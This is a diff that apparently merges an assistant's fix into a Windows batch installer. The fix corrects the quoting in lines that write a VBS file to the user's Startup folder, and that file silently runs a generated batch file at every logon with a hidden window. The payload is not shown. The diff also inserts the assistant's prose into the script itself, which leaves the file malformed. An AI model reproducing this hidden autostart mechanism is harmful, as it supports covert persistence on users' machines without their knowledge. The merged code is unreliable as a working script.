@@ -1,3 +1,8 @@
+The error is occurring because of how the quotes are being handled when the batch file creates the VBS script. The path %TARGET_DIR% contains spaces, and the escaping is failing, causing a syntax error in the generated VBS file.
+
+Here is the corrected version. This version uses a more robust method to create the VBS file, avoiding the complex escaping issues:
+batch
+
 @echo off
 setlocal
 
@@ -36,10 +41,9 @@ del "%TARGET_DIR%\%ZIP_NAME%"
 ) > "%TARGET_DIR%\%BAT_FILE%"
 
 :: Create VBS script to run batch silently
-(
-  echo Set WshShell = CreateObject("WScript.Shell"^)
-  echo WshShell.Run """"%TARGET_DIR%\%BAT_FILE%"""", 0
-  echo Set WshShell = Nothing
-) > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
+echo Set WshShell = CreateObject("WScript.Shell") > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
+echo command = "%TARGET_DIR%\%BAT_FILE%" >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
+echo WshShell.Run command, 0, False >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
+echo Set WshShell = Nothing >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbs_start.vbs"
 
 echo Installation complete.
